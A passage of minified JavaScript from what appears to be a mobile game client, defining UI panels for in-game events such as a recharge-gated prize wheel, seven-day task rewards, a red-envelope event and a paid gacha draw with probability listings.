t,e,i=this._balls.length,n=0,o=0,s=0;i>s;s++)t=this._balls[s],t.x=this._a*Math.cos(this._angles[s])+this._circleCenter.x,t.y=this._b*Math.sin(this._angles[s])+this._circleCenter.y,this._angles[s]+=this._angle,this._angles[s]=this._angles[s]%(2*Math.PI),e=t.parent,n=e.getChildIndex(this.img),o=e.getChildIndex(t),this._angles[s]>=2.5&&this._angles[s]<=6?o>n&&e.addChildAt(t,3):n>o&&e.addChildAt(t,e.numChildren)},e.prototype.resetBalls=function(){if(Timer.stopAll(this),this._balls){for(var t=this._balls.length,e=0;t>e;e++)o.DisplayUtils.removeFromParent(this._balls[e]);this._balls.length=0,this._balls=null}},e}(a.BaseView);e.OSATarget0Panel9=u,window.OSATarget0Panel9=u,__reflect(u.prototype,"OSATarget0Panel9",[]),window.OSATarget0Panel9=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NoticeYBListRenderer=e.OSATarget10Panel=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=i(4),l=i(2),h=i(9),u=i(30),p=i(29),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="YbTurntableSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.skinName||(this.skinName="YbTurntableSkin"),this.actType=p.ActivityPanel.getActivityTypeFromId(this.activityID),this.ins=h.Activity.ins(),this.actCfg=a.GlobalConfig.ActivityConfig[this.activityID],this.cfgs=a.GlobalConfig.ActivityType10Config[this.activityID]},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.removeObserve(),this.rolling=!1,this.isClick=!1,Timer.stopAll(this),this.activityID&&this.ins){var i=this.ins.activityData[this.activityID];i&&i&&i.state&&this.ins.sendReward(this.activityID,this.level)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(this.ins.postChangePage,this.resultCallBack),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this.choujiangBtn,this.getLottery),this.addTouchEvent(this.lb_GaiLv0,this.showGaiLv),this.list.itemRenderer=c,this.tttzhiShow.visible=!1,this.updateView()},e.prototype.updateView=function(){var t=this.ins.activityData[this.activityID];if(t){var e=this.cfgs;this.level=t.getLevel();var i=this.level,n=!1;this.level||(i=Object.keys(e).length,n=!0);for(var s=e[i],a=0;a<s.info.length;a++)this["multiple"+a].text=gettext("{0}倍",s.info[a].multiple);this.pay0.text=s.yuanBao+"";var r=65280,l=0;t.yb<s.recharge&&(r=16711680,l=s.recharge-t.yb),n?this.label_needCharge.text=gettext("充值转盘全部抽取完毕"):this.label_needCharge.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("再充值|C:{0}&T:{1}|C:0x00ff00&T:元宝可激活",r,l)),this.listRefush(),this.setTime();var h=this.actCfg[this.activityID];h&&(this.title.source=h.title)}},e.prototype.resultCallBack=function(t){if(this.isClick){var e=this.ins.activityData[this.activityID];this.activityID==t&&(e&&e.state&&this.beginLottery(e.index),this.updateView(),this.listRefush())}},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){e.ins.sendReward(e.activityID,e.level),e.tttzhiShow.visible=!0,e.tttzhiShow.rotation=i,setTimeout(function(){e.rolling=!1,e.isClick=!1},2e3)},this)},e.prototype.getLottery=function(){if(!this.level)return l.TipsCT.ins().showTips(gettext("充值转盘全部抽取完毕")),void(this.isClick=!1);var t=this.ins.activityData[this.activityID],e=this.cfgs[this.level];return t&&!t.getCondition(this.level)?(l.TipsCT.ins().showTips(gettext("还需要充值{0}元宝激活",e.recharge-t.yb)),void(this.isClick=!1)):this.rolling?void l.TipsCT.ins().showTips(gettext("正在抽奖，请稍候")):this.isClick?void l.TipsCT.ins().showTips(gettext("等待抽奖结果 请稍后")):void(r.ActorCC.yb>=e.yuanBao?(this.tttzhiShow.visible=!1,this.isClick=!0,this.ins.sendReward(this.activityID,this.level)):(l.TipsCT.ins().showTips(gettext("元宝不足")),this.isClick=!1))},e.prototype.showGaiLv=function(){var t;if(a.GlobalConfig.ActivityType10Config[this.activityID]){var e=this.level;if(!this.level){var i=a.GlobalConfig.ActivityType10Config[this.activityID];for(var n in i){var o=parseInt(n);o&&o>e&&(e=o)}}if(a.GlobalConfig.ActivityType10Config[this.activityID][e]){var s=null===(t=a.GlobalConfig.HelpInfoConfig[33])||void 0===t?void 0:t.text;if(s){var r=a.GlobalConfig.ActivityType10Config[this.activityID][e].info;if(r){var l=r.concat([]);l.sort(function(t,e){return t.multiple-e.multiple});for(var h=0,u=l;h<u.length;h++){var p=u[h];if(p.multiple&&p.value){var d=void 0;d=p.multiple>=5?"0xff0000":p.multiple>=3?"0xff9900":p.multiple>=2?"0xf335ff":"0x45ff7a",s+=gettext("|C:{0}&T:{1}倍：{2}%|",d,p.multiple,p.value/100)+"\n"}}win.open("CommonHelpWin",s)}}}}},e.prototype.listRefush=function(){var t=this.ins.activityData[this.activityID];if(t){this.list.dataProvider||(this.list.dataProvider=new eui.ArrayCollection);for(var e=this.list.dataProvider,i=[],n=0;n<t.noticeArr.length;n++){var o={activityID:this.activityID,name:t.noticeArr[n].name,multiple:t.noticeArr[n].multiple,yb:t.noticeArr[n].yb};i.push(o)}e.replaceAll(i)}},e.prototype.setTime=function(){var t=this.ins.activityData[this.activityID];t&&(this.actTime.text=gettext("剩余时间：{0}",t.getRemainTime()))},e}(p.ActivityPanel);e.OSATarget10Panel=d,window.OSATarget10Panel=d,__reflect(d.prototype,"OSATarget10Panel",[]);var c=function(t){function e(){var e=t.call(this)||this;return e.skinName="HuntListRendererSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data.name;this.activityID=this.data.activityID;var e=this.data.multiple,i=this.data.yb,s="",a="",r=n.ColorUtil.NORMAL_COLOR;a=u.RewardData.getCurrencyName(2),r=16711680,s="<font color = '#16b2ff'>"+t+gettext("</font> 在元宝转盘中抽中了 <font color='")+r+"'>"+e+gettext("</font>倍，获得<font color='")+r+"'>"+i+gettext("</font>元宝"),this.showText.textFlow=o.TextFlowMaker.generateTextFlow(s)},e}(s.BaseItemRender);e.NoticeYBListRenderer=c,window.NoticeYBListRenderer=c,__reflect(c.prototype,"NoticeYBListRenderer",[]),window.NoticeYBListRenderer=c,window.OSATarget10Panel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget11Panel2=void 0;var n=i(24),o=i(0),s=i(9),a=i(543),r=i(541),l=i(545),h=i(544),u=i(29),p=i(2),d=i(542),c=function(t){function e(){var e=t.call(this)||this;return e._curDay=0,e._curDayIndex=0,e._curGroupIndex=0,e._sn_="sevenDayWin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.update()},e.prototype.update=function(){var t=o.GlobalConfig.ActivityConfig[this.activityID];t.pageSkin?(this.tabP.itemRenderer=l.HappySevenDayTabListItemRender,this.tabD.itemRenderer=r.HSDTabListItemRender,this.eList.itemRenderer=h.HappySevenDayScoreItem,this.showType=!1):(this.showType=!0,this.tabP.itemRenderer=l.HappySevenDayTabListItemRender,this.tabD.itemRenderer=d.HappySevenDayDayItem,this.eList.itemRenderer=h.HappySevenDayScoreItem),this.list.itemRenderer=a.HappySevenDayItemRender,this.ins=s.Activity.ins(),this.cfgs=o.GlobalConfig.ActivityType11Config[this.activityID],this.actInfo0.text=t.desc,this._curDayIndex=0,this._curGroupIndex=0,this.updateView(),this.updateTabs(),this.tabD.selectedIndex=this._curDayIndex,this.tabP.selectedIndex=this._curGroupIndex,this.updateData(),this.updateTargetAward(),this.addTouchEvent(this,this.onTouch),observe(this,this.refreshReds,this.ins.postActivityIsGetAwards),this.addChangeEvent(this.tabD,this.onClickBtn),this.addChangingEvent(this.tabD,this.onTabTouching),this.addChangeEvent(this.tabP,this.onTabBtn),Timer.start(1e3,0,this.setTime,this),this.updateLock(),this.setTime();var e=this.ins.getbtnInfo(this.activityID);(null===e||void 0===e?void 0:e.titleImg)&&(this.actTitle.source=null===e||void 0===e?void 0:e.titleImg),(null===e||void 0===e?void 0:e.bgImg)&&(this.actBg.source=null===e||void 0===e?void 0:e.bgImg)},e.prototype.updateView=function(){var t;this.data=this.ins.getActivityDataById(this.activityID),this._curDay=this.data.getCurDay(),this._items=[];var e,i,n,s,a,r,l=o.GlobalConfig.ActivityType11_2Config[this.activityID],h=[],u=[];for(var p in l)u.push(l[p]);for(var d=[],c=0;c<u.length;c++)d[u[c].day]||(d[u[c].day]=[]),d[u[c].day].push(u[c]);for(var c=0;c<d.length;c++){var f=d[c];if(f)for(var g=0;g<f.length;g++){var m=!1;if(r=this.data.achieveInfo[f[g].index-1],this._curDay>=(f[g].day||0)&&!r.isGot&&r.times>=f[g].dayLimit&&void 0==f[g].maxCount){m=!0,h.push({name:gettext("{0}天",f[g].day),downIcon:f[g].dayImg?f[g].dayImg:"Role_yq3",upIcon:f[g].dayImg?f[g].dayImg:"Role_yq4",res:f[g].dayImg,isOpen:this._curDay>=f[g].day,redP:m,day:f[g].day});break}g==f.length-1&&h.push({name:gettext("{0}天",f[g].day),downIcon:f[g].dayImg?f[g].dayImg:"Role_yq3",upIcon:f[g].dayImg?f[g].dayImg:"Role_yq4",res:f[g].dayImg,isOpen:this._curDay>=f[g].day,redP:m,day:f[g].day})}}for(var p in l)e=l[p],n=e.day,i=this._items[e.day-1],i||(i=[],this._items[e.day-1]=i),r=this.data.achieveInfo[e.index-1],this._curDay>=e.day&&!r.isGot&&r.times>=e.dayLimit&&void 0==e.maxCount&&(h[e.day-1].showRed=!0),s=e.group,a=i[s-1],a||(a=[],i[s-1]=a),a.push(e);this._btnCollect||(this._btnCollect=new eui.ArrayCollection,this.tabD.dataProvider=this._btnCollect),this._btnCollect.source=h;for(var c=0;c<this.tabD.numElements;c++){var v=this.tabD.getElementAt(c);v&&v.redpoint&&(v.redpoint.visible=(null===(t=h[c])||void 0===t?void 0:t.showRed)?!0:!1)}this.tabD.validateNow(),this._tabCollect||(this._tabCollect=new eui.ArrayCollection,this.tabP.dataProvider=this._tabCollect)},e.prototype.refreshReds=function(){this.updateView(),this.updateTabs(),this.updateData(),this.updateTargetAward()},e.prototype.updateData=function(){var t=this._items[this._curDayIndex][this._curGroupIndex];if(t&&t.length){this._listCollect||(this._listCollect=new eui.ArrayCollection,this.list.dataProvider=this._listCollect);for(var e,i,n=t.length,o=[],s=0,a=0,r=this.ins.getActivityDataById(this.activityID),l=0;n>l;l++)e=t[l],i=r.achieveInfo[e.index-1],i.isGot?(s=2,a=2):i.times>=e.dayLimit?(s=1,a=0):(s=0,a=1),o[l]={activityID:this.activityID,conf:e,state:s,sortNum:a,times:i.times,activityType:this.activityType};o.sort(this.sort),this._listCollect.source=o}},e.prototype.sort=function(t,e){return t.sortNum<e.sortNum?-1:1},e.prototype.updateTargetAward=function(){var t=null,e=this.ins.getActivityDataById(this.activityID).hiScore;if(!this.showType){var i=this.cfgs;for(var o in i)!t&&e<i[o].score&&(t=i[o])}if(t||(t=this.cfgs[Object.keys(this.cfgs).length]),this.schedule&&(this.schedule.maximum=t.score,this.schedule.value=e),this.eScore&&(this.eScore.text=e+""),this.eList){var s=n.CommonUtils.objectToArray(this.cfgs),a=[];for(var o in s)a.push([s[o],this.data]);this.eList.dataProvider=new eui.ArrayCollection(a)}},e.prototype.onTouch=function(t){if(t.target instanceof h.HappySevenDayScoreItem){var e=t.target.data[0],i=this.ins.getActivityDataById(this.activityID);switch(i.getRewardState(e.index)){case 1:this.ins.sendReward(this.activityID,e.index,1)}}else switch(t.target){case this.closeBtn:win.close(this);break;case this.rewardBtn:var n=this.cfgs;for(var o in n){0==n[o].rewardType?win.open("CDYBZhuanPanRewardWin",this.activityID):win.open("SDRewardWin",this.activityID);break}}},e.prototype.onTabBtn=function(t){this._curGroupIndex!=t.currentTarget.selectedIndex&&(this._curGroupIndex=t.currentTarget.selectedIndex,this.tabP.selectedIndex=this._curGroupIndex,this.updateData())},e.prototype.onTabTouching=function(t){if(this._curDayIndex==t.currentTarget.selectedIndex)return void t.preventDefault();var e=this.tabD.getChildAt(t.currentTarget.selectedIndex),i=e.data;i.isOpen=!0;i.isOpen||(p.TipsCT.ins().showTips(gettext("活动第{0}天开启",i.day)),t.preventDefault())},e.prototype.onClickBtn=function(t){if(this._curDayIndex!=t.currentTarget.selectedIndex){var e=this.tabD.getChildAt(t.currentTarget.selectedIndex);e.selected=!1;var i=e.data;i.isOpen=!0;i.isOpen?this._curDayIndex=t.currentTarget.selectedIndex:p.TipsCT.ins().showTips(gettext("活动第{0}天开启",i.day)),this.updateLock(),this.tabD.selectedIndex=this._curDayIndex,e=this.tabD.getChildAt(this._curDayIndex),this.tabD.getChildAt(this._curDayIndex),e.selected=!0,this.updateTabs(),this.tabP.selectedIndex=this._curGroupIndex=0,this.updateData()}},e.prototype.updateTabs=function(){var t,e,i,n=this._items[this._curDayIndex],o=this.ins.getActivityDataById(this.activityID),s=[];for(var a in n){s.push({res:n[a][0].gName,showRed:!1}),t=n[a].length;for(var r=0;t>r;r++)if(i=n[a][r],e=o.achieveInfo[i.index-1],this._curDay>=(i.day||0)&&!e.isGot&&e.times>=i.dayLimit&&void 0==i.maxCount){s[a].showRed=!0;break}}this._tabCollect.source=s},e.prototype.updateLock=function(){if(this.lock){var t=this.tabD.selectedItem;this.lock.visible=!t.isOpen,this.eLockLab.text=gettext("活动第{0}天开启，敬请期待",t.day)}},e.prototype.setTime=function(){var t=this.ins.getActivityDataById(this.activityID);t&&(this.actTime0.text=t.getRemainTime())},e.prototype.tabRp=function(){var t=s.Activity.ins().getActivityDataById(this.activityID);return t?t.rp.v||!1:!1},__decorate([callDelay(100)],e.prototype,"update",null),e}(u.ActivityPanel);e.OSATarget11Panel2=c,window.OSATarget11Panel2=c,__reflect(c.prototype,"OSATarget11Panel2",[]),window.OSATarget11Panel2=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget11Panel3=void 0;var n=i(5),o=i(11),s=i(0),a=i(6),r=i(2),l=i(9),h=i(33),u=i(29),p=i(549),d=i(550),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.curSelect=1,e._sn_="osa11p3skin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dayViews=[this.eDay1,this.eDay2,this.eDay3,this.eDay4,this.eDay5,this.eDay6,this.eDay7],this.list0DP=new eui.ArrayCollection,this.list0.itemRenderer=o.ItemBase,this.list0.dataProvider=this.list0DP,this.listDP=new eui.ArrayCollection,this.list.itemRenderer=d.Osa11p3projectitem,this.list.dataProvider=this.listDP
},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),this.observe(l.Activity.ins().postActivityIsGetAwards,this.updateView);var i=s.GlobalConfig.ActivityConfig[this.activityID];i.pageSkin&&(this._sn_=i.pageSkin),this.activityType==h.ActivityType.Normal&&(this.ins=l.Activity.ins(),this.cfgs=s.GlobalConfig.ActivityType11Config[this.activityID],this.cfg2=s.GlobalConfig.ActivityType11_2Config[this.activityID]),Timer.start(1e3,0,this.setTime,this),this.actInfo.text=i.desc,this.initDaysView(),this.updateView()},e.prototype.onClick=function(t){if(t.target instanceof p.Osa11p3item){var e=t.target.day;if(e==this.curSelect)return;return this.dayViews[this.curSelect-1].select=!1,t.target.select=!0,this.curSelect=e,void this.updateView()}if(t.target instanceof eui.Button&&t.target.parent instanceof d.Osa11p3projectitem){var i=t.target.parent.data;return a.BagCT.ins().getAllSurplusCount(1)<0?void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void this.ins.sendReward(this.activityID,i.index,2)}switch(t.target){case this.actBtn:var n=this.ins.getActivityDataById(this.activityID),o=n.getGroupRewardState(this.curSelect);switch(o){case 1:if(a.BagCT.ins().getAllSurplusCount(1)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));this.ins.sendReward(this.activityID,this.curSelect,1);break;case 0:r.TipsCT.ins().showTips(gettext("请完成任务后再试"))}}},e.prototype.updateView=function(){for(var t in this.cfg2)if(this.cfg2[t].group==this.curSelect){this.eDaySel.cfg=this.cfg2,this.eDaySel.day=this.cfg2[t].group,this.eDaySel.select=!1;break}this.list0DP.source=this.cfgs[this.curSelect].reward,this.updateDaysView(),this.updateTask()},e.prototype.updateTask=function(){var t=this.ins.getActivityDataById(this.activityID),e=t.getGroupTaskFinishNum(this.curSelect),i=t.getCfg2ByGroup(this.curSelect).length;switch(this.sTaskLab=gettext("任务")+"（"+e+"/"+i+"）",this.listDP.source=t.getCfg2ByGroup(this.curSelect),this.eGetImg.visible=this.actBtn.eRp.visible=!1,t.getGroupRewardState(this.curSelect)){case 1:this.actBtn.eRp.visible=this.actBtn.visible=!0;break;case 2:this.eGetImg.visible=!0,this.actBtn.visible=!1;break;default:this.actBtn.visible=!0}this.curSelect>1&&0==t.getGroupRewardState(this.curSelect-1)?(this.eBtnTips.textFlow=n.TextFlowMaker.generateTextFlow(this.cfgs[this.curSelect-1].showText),this.eBtnTips.visible=!0):this.eBtnTips.visible=!1,this.eBtnGroup.visible=!this.eBtnTips.visible},e.prototype.initDaysView=function(){for(var t=this.dayViews.length,e=0;t>e;e++)this.dayViews[e].day=e+1,this.dayViews[e].cfg=this.cfg2,this.dayViews[e].select=e+1==this.curSelect},e.prototype.updateDaysView=function(){for(var t=this.ins.getActivityDataById(this.activityID),e=this.dayViews.length,i=1;e>=i;i++){this.dayViews[i-1].showRed(!1);var n=1==i&&1==t.getGroupRewardState(i)||i>1&&1==t.getGroupRewardState(i)&&t.getGroupRewardState(i-1)>=1;if(n)this.dayViews[i-1].showRed(n);else{var o=t.getCfg2ByGroup(i);for(var s in o)if(1==t.getTaskState(o[s].index)){this.dayViews[i-1].showRed(!0);break}}}},e.prototype.tabRp=function(){var t=l.Activity.ins().getActivityDataById(this.activityID);return null===t||void 0===t?void 0:t.rp.v},e.prototype.setTime=function(){var t=this.ins.getActivityDataById(this.activityID);t&&(this.actTime.text=t.getRemainTime())},e}(u.ActivityPanel);e.OSATarget11Panel3=c,window.OSATarget11Panel3=c,__reflect(c.prototype,"OSATarget11Panel3",[]),window.OSATarget11Panel3=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget12Panel1=void 0;var n=i(24),o=i(8),s=i(42),a=i(0),r=i(7),l=i(2),h=i(9),u=i(29),p=i(548),d=i(551),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="XNHongBaoSkin",e._time=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];Timer.stopAll(this),this.removeObserve()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(h.Activity.ins().postChangePage,this.updateLogs),this.addTouchEvent(this.onbtn,this.onTap),this.addTouchEvent(this.leftBtn,this.onTap),this.addTouchEvent(this.rightBtn,this.onTap),Timer.start(1e3,0,this.setTime,this),this.dataArr||(this.list.itemRenderer=d.XiaoNianListRenderer,this.dataArr=new eui.ArrayCollection,this.list.dataProvider=this.dataArr),this.index=this.getRuleIndex(),this.updateData(),this.updateLogs()},e.prototype.getRuleIndex=function(){var t=1,e=h.Activity.ins().getActivityDataById(this.activityID);for(var i in a.GlobalConfig.ActivityType12Config[this.activityID])e.score>=a.GlobalConfig.ActivityType12Config[this.activityID][i].score&&(t=a.GlobalConfig.ActivityType12Config[this.activityID][i].index);return t},e.prototype.GetCallBack=function(t){t==this.activityID&&this.updateData()},e.prototype.onTap=function(t){switch(t.currentTarget){case this.onbtn:var e=h.Activity.ins().getActivityDataById(this.activityID);if(!e.isOpenActivity())return void l.TipsCT.ins().showTips(gettext("活动已结束"));var i=a.GlobalConfig.ActivityType12Config[this.activityID];i&&i[this.index]&&(e.score>=i[this.index].score?win.open(p.HongBaoSpeak,this.activityID,this.index):l.TipsCT.ins().showTips(gettext("积分不足")));break;case this.leftBtn:if(this.index<=1)return;this.index--,this.updateBtn();break;case this.rightBtn:if(this.index>=n.CommonUtils.getObjectLength(a.GlobalConfig.ActivityType12Config[this.activityID]))return;this.index++,this.updateBtn()}},e.prototype.updateBtn=function(){1==this.index?(this.leftBtn.visible=!1,this.rightBtn.visible=!0):this.index==n.CommonUtils.getObjectLength(a.GlobalConfig.ActivityType12Config[this.activityID])?(this.leftBtn.visible=!0,this.rightBtn.visible=!1):this.leftBtn.visible=this.rightBtn.visible=!0;var t=a.GlobalConfig.ActivityType12Config[this.activityID][this.index];this.hongbao.data=t.skinType;var e=h.Activity.ins().getActivityDataById(this.activityID);this.redPoint.visible=e.score>=t.score},e.prototype.updateLogs=function(){var t=[],e=h.Activity.ins().getActivityDataById(this.activityID);this.actPoint.text=e.score+"";for(var i=e.logs.length-1;i>=0;i--){var n=a.GlobalConfig.ActivityType12Config[this.activityID][e.logs[i].index],o="s"+e.logs[i].serverId+"."+e.logs[i].name,r=s.StringUtils.replace(n.record,o);t.push(r)}this.dataArr.replaceAll(t)},e.prototype.updateData=function(){var t=h.Activity.ins().getActivityDataById(this.activityID),e=a.GlobalConfig.ActivityConfig[this.activityID],i=Math.floor((o.DateUtils.formatMiniDateTime(t.startTime)-r.GameServerCC.serverTime)/1e3),n=Math.floor((o.DateUtils.formatMiniDateTime(t.endTime)-r.GameServerCC.serverTime)/1e3);i>=0?this.actTime.text=gettext("活动未开启"):0>=n?this.actTime.text=gettext("活动已结束"):(this._time=n,this._time<0&&(this._time=0),this.actTime.text=o.DateUtils.getFormatBySecond(n,o.DateUtils.TIME_FORMAT_5,3)),this.actInfo.text=e.desc,this.updateBtn()},e.prototype.setTime=function(){var t=h.Activity.ins().getActivityDataById(this.activityID);t&&(this.actTime.text=t.getRemainTime())},e.prototype.tabRp=function(){var t=h.Activity.ins().getActivityDataById(this.activityID);return null===t||void 0===t?void 0:t.rp.v},e}(u.ActivityPanel);e.OSATarget12Panel1=c,window.OSATarget12Panel1=c,__reflect(c.prototype,"OSATarget12Panel1",[]),window.OSATarget12Panel1=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget18Panel1=void 0;var n=i(55),o=i(18),s=i(5),a=i(0),r=i(4),l=i(6),h=i(2),u=i(111),p=i(9),d=i(29),c=i(552),f=function(t){function e(e){var i=t.call(this)||this;return i.addBoxEvent=!1,i.huntType=1,i}return __extends(e,t),e.prototype.init=function(){for(var t,e=a.GlobalConfig.ActivityType18Config[this.activityID],i=e[0],n=i.showDrop.length,o=0;n>o&&16>o;o++)t=this["gift"+o],t.data=i.showDrop[o],1>=o&&t.setItemHeirloomBgImg(!0,"csbk03");for(var s in e)1==e[s].count?this.yb1.text=e[s].yb+"":10==e[s].count&&(this.yb10.text=e[s].yb+"")},e.prototype.skinComplete=function(){this.lb_GaiLv.textFlow=HtmlUtil.parse(HtmlUtil.underLine(gettext("概率公示"))),this.list.itemRenderer=c.OSATarget18Renderer,this.jpList.itemRenderer=c.OSATarget18Renderer,this.list.dataProvider=this.listArc=new eui.ArrayCollection,this.jpList.dataProvider=this.jpListArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){this.init(),this.setCurSkin(),this.addTouchEvent(this.buy1,this.onBuy),this.addTouchEvent(this.buy10,this.onBuy),this.addTouchEvent(this.lb_GaiLv,this.showGaiLv),this.observe(p.Activity.ins().postChangePage,this.updateData),this.timeClock(),Timer.stop(this.timeClock,this),Timer.start(1e3,0,this.timeClock,this),this.addBoxEvent=!0,p.Activity.ins().sendChangePage(this.activityID)},e.prototype.close=function(){this.removeTouchEvent(this.buy1,this.onBuy),this.removeTouchEvent(this.buy10,this.onBuy),this.removeObserve(),Timer.stop(this.timeClock,this),this.addBoxEvent=!1},e.prototype.updateData=function(){this.listRefush(),this.updateBox(),this.updateMaterial()},e.prototype.setCurSkin=function(){var t=a.GlobalConfig.ActivityConfig[this.activityID];t.pageSkin&&(this._sn_=t.pageSkin)},e.prototype.timeClock=function(){var t=p.Activity.ins().getActivityDataById(this.activityID);t&&(this.endedTime=t.getLeftTime(),this.leftTimeTxt.text=this.endedTime)},e.prototype.listRefush=function(){var t=p.Activity.ins().getActivityDataById(this.activityID);this.listArc.replaceAll(t.logs),this.jpListArc.replaceAll(t.bestlogs)},e.prototype.onBuy=function(t){switch(t.target){case this.buy1:this.buyHunt(1);break;case this.buy10:this.buyHunt(2)}},e.prototype.buyHunt=function(t){if(l.BagCT.ins().getAllSurplusCount(1)<0)return void h.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));this.huntType=t;var e=a.GlobalConfig.ActivityType18Config[this.activityID],i=l.BagCT.ins().getBagGoodsByTypeAndId(l.BagCT.BAG_TYPE_OTHTER,e[t].item);if(i&&i.count)p.Activity.ins().sendReward(this.activityID,t);else{var n=t>1?10:1,o=e[t].yb;u.HuntWarnBuyWin.showBuyWarn("OSATarget18Panel1-HuntResultWin"+(10==n?1:0),this.huntWarnFun.bind(this),gettext("是否消耗{0}元宝购买{1}*{2}",o,a.GlobalConfig.ItemConfig[e[t].item].name,n))}},e.prototype.huntWarnFun=function(){var t=a.GlobalConfig.ActivityType18Config[this.activityID][this.huntType].yb;r.ActorCC.yb>=t?p.Activity.ins().sendReward(this.activityID,this.huntType):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))},e.prototype.updateBox=function(){var t=a.GlobalConfig.ActivityType18Config[this.activityID],e=[];for(var i in t)t[i].dbCount&&e.push(t[i]);e.sort(function(t,e){return n.Algorithm.sortAsc(t.dbCount,e.dbCount)});var o,s,r=p.Activity.ins().getActivityDataById(this.activityID),l=0,h=e.length,u=0;for(var d in e){if(s=e[d],this["time"+l].text=gettext("{0}次",s.dbCount),this["time"+l].visible=!0,this["done"+l].visible=!1,this["boxPoint"+l].visible=!1,this["bar"+l].value=0,this["bar"+l].maximum=100,this["box"+l].source="200116_0_png",this["box"+l].name="box"+s.index,this.addBoxEvent||this.addTouchEvent(this["box"+l],this.onGetAward),h>l)if(o=r.getStateByIndex(s.index),2==o)this["box"+l].source="200116_png",this["bar"+l].value=100,this["boxPoint"+l].visible=!0;else if(1==o)this["time"+l].visible=!1,this["done"+l].visible=!0,this["bar"+l].value=100;else{var c=Math.floor((r.num-u)/(s.dbCount-u)*100);0>c?c=0:c>100&&(c=100),this["bar"+l].value=c}u=s.dbCount,l++}var f=a.GlobalConfig.ItemConfig[t[1].item];f?this.icon10.source=this.icon1.source=""+RES_DIR_ITEMICON+f.icon+".png":this.icon10.source=this.icon1.source=""},e.prototype.onGetAward=function(t){var e=t.target.name.slice(3,4),i=p.Activity.ins().getActivityDataById(this.activityID),n=i.getStateByIndex(e);2==n?p.Activity.ins().sendReward(this.activityID,e):win.open("HuntBoxsTips",e,3,this.activityID)},e.prototype.updateMaterial=function(){var t=l.BagCT.ins().getBagGoodsByTypeAndId(0,a.GlobalConfig.ActivityType18Config[this.activityID][1].item),e=t?t.count:0;this.num.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+(e?o.ColorUtil.GREEN_COLOR_N:o.ColorUtil.RED_COLOR_N)+"&T:"+e+"|"),this.num10.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+(e>=10?o.ColorUtil.GREEN_COLOR_N:o.ColorUtil.RED_COLOR_N)+"&T:"+e+"|")},e.prototype.showGaiLv=function(){var t;if(a.GlobalConfig.ActivityType18Config[this.activityID]&&a.GlobalConfig.ActivityType18Config[this.activityID][0]){var e=a.GlobalConfig.ActivityType18Config[this.activityID][0].dropShow;win.open("CommonHelpWin",null===(t=a.GlobalConfig.HelpInfoConfig[e])||void 0===t?void 0:t.text)}},e}(d.ActivityPanel);e.OSATarget18Panel1=f,window.OSATarget18Panel1=f,__reflect(f.prototype,"OSATarget18Panel1",[]),window.OSATarget18Panel1=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(18),o=i(24),s=i(5),a=i(1),r=i(11),l=i(0),h=i(4),u=i(6),p=i(2),d=i(111),c=i(9),f=i(1495),g=i(553),m=function(t){function e(e){var i=t.call(this)||this;return i.huntType=1,i.first=!1,i._sn_="wishDragonBallSkin",i.sendBuyType=0,i}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.tabRp=function(){var t=c.Activity.ins().getActivityDataById(this.activityID);return t&&t.rp.v},e.prototype.addDisplay=function(){this.init(),this.addTouchEvent(this.buy1,this.onBuy),this.addTouchEvent(this.buy10,this.onBuy),this.addTouchEvent(this.lb_GaiLv,this.onBuy);for(var t=1;7>=t;t++)this.addTouchEvent(this["ball"+t],this.onBuy);this.addTouchEvent(this.getItemTxt,this.onBuy),this.observe(c.Activity.ins().postHuntResultPlayFunc,this.callbackPlayEff),this.observe(c.Activity.ins().postRewardResult,this.RewardResult),this.observe(c.Activity.ins().postHuntResultFunc,this.updateGetLongZhu),this.observe(c.Activity.ins().postActivityIsGetAwards,this.updateGetLongZhu),this.rewardList.itemRenderer=r.ItemBase,this.timeClock(),Timer.stop(this.timeClock,this),Timer.start(1e3,0,this.timeClock,this),this.updateData(),this.updateData2(!0),c.Activity.ins().sendChangePage(this.activityID)},e.prototype.init=function(){var t=l.GlobalConfig.ActivityType18Config[this.activityID];t[0];for(var e in t)1==t[e].count?this.yb1.text=t[e].yb+"":10==t[e].count&&(this.yb10.text=t[e].yb+"");this.lb_GaiLv&&(this.lb_GaiLv.visible=!1)},e.prototype.close=function(){for(var 